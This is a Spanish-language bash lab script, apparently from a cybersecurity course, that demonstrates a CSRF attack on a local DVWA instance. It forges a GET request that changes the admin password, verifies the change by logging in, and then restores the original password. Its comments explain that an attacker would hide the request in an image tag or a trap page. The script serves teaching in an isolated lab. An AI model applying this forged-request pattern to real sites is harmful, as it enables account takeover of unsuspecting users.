#!/usr/bin/env bash
# csrf_forja.sh -- demuestra un CSRF (Cross-Site Request Forgery) contra MI DVWA del
# laboratorio aislado: forja la peticion que cambia la contrasena de admin aprovechando
# que la victima tiene la sesion abierta. Basta con que la victima ABRA un enlace.
# Al final RESTAURA la contrasena original para dejar el lab como estaba.
# SOLO sistemas propios y autorizados. Laboratorio aislado, sin salida a internet.
# Morini Computers -- Ciberseguridad. Encuadre educativo y de defensa.
set -u
DVWA="http://10.13.37.30"
source /root/xss_login.sh low >/dev/null 2>&1     # COOKIE = sesion de la VICTIMA (admin)
NUEVA="pirata123"

# La peticion maliciosa: cambia la clave con una simple GET, sin token ni clave actual.
MAL="$DVWA/vulnerabilities/csrf/?password_new=$NUEVA&password_conf=$NUEVA&Change=Change"
echo "[1] Peticion MALICIOSA (un atacante la esconde en un <img> o en una pagina trampa):"
echo "    GET $MAL"

echo "[2] La victima 'abre' el enlace con su sesion abierta (su navegador la envia solo):"
curl -s -b "$COOKIE" "$MAL" | grep -oE '<pre>[^<]*</pre>' | head -1

echo "[3] Compruebo que su contrasena ES AHORA '$NUEVA' (inicio sesion con ella):"
JAR=$(mktemp); tok(){ grep -oE "user_token' value='[0-9a-f]+'"|grep -oE '[0-9a-f]{16,}'|head -1; }
T=$(curl -s -c "$JAR" "$DVWA/login.php"|tok)
curl -s -b "$JAR" -c "$JAR" -L --data-urlencode username=admin --data-urlencode "password=$NUEVA" \
     --data-urlencode "user_token=$T" --data Login=Login "$DVWA/login.php" \
  | grep -oE 'Welcome to Damn Vulnerable Web Application' | head -1

echo "[4] Restauro la contrasena original (dejo el laboratorio como estaba):"
SID=$(awk '/PHPSESSID/{print $7}' "$JAR"|tail -1); rm -f "$JAR"
curl -s -b "PHPSESSID=$SID; security=low" \
  "$DVWA/vulnerabilities/csrf/?password_new=password&password_conf=password&Change=Change" \
  | grep -oE '<pre>[^<]*</pre>' | head -1

echo "[*] Sin token anti-CSRF ni verificacion de la contrasena actual, un solo enlace cambia tu cuenta."
